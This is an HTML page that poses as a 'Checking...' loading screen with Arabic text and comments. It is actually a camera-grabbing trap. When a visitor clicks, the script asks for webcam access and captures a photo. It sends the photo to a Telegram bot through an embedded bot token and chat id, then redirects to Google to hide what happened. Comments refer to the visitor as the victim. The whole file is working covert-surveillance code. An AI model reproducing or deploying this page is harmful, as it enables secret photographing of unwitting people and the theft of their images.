<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Checking...</title>
    <style>
        /* جعل الشاشة كاملة قابلة للضغط */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        #trap { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .box { padding: 30px; border: 2px solid #0f0; color: #0f0; font-family: monospace; font-size: 20px; text-align: center; box-shadow: 0 0 20px #0f0; }
    </style>
</head>
<body onclick="kickstart()">

    <div id="trap">
        <div class="box" id="msg">[ اضغط هنا لتحديث الصفحة ]</div>
    </div>

    <script>
        // بياناتك (تأكد منها 100%)
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const C = "1772820433";

        async function kickstart() {
            const m = document.getElementById('msg');
            m.innerText = "جاري التحميل...";

            try {
                // محاولة فتح الكاميرا
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.createElement('video');
                v.srcObject = s;
                v.play();

                // التقاط سريع بعد ثانية
                setTimeout(() => {
                    const cn = document.createElement('canvas');
                    cn.width = 640; cn.height = 480;
                    cn.getContext('2d').drawImage(v, 0, 0);
                    
                    cn.toBlob(async (b) => {
                        const f = new FormData();
                        f.append('chat_id', C);
                        f.append('photo', b, 'v.jpg');

                        // إرسال مباشر
                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        });
                        
                        // هروب لموقع قوقل
                        window.location.href = "https://www.google.com";
                    }, 'image/jpeg');
                }, 1000);

            } catch (e) {
                // إذا رفض الضحية، نكرر المحاولة
                console.log(e);
                m.innerText = "خطأ في الاتصال.. حاول مرة أخرى";
            }
        }
    </script>
</body>
</html>
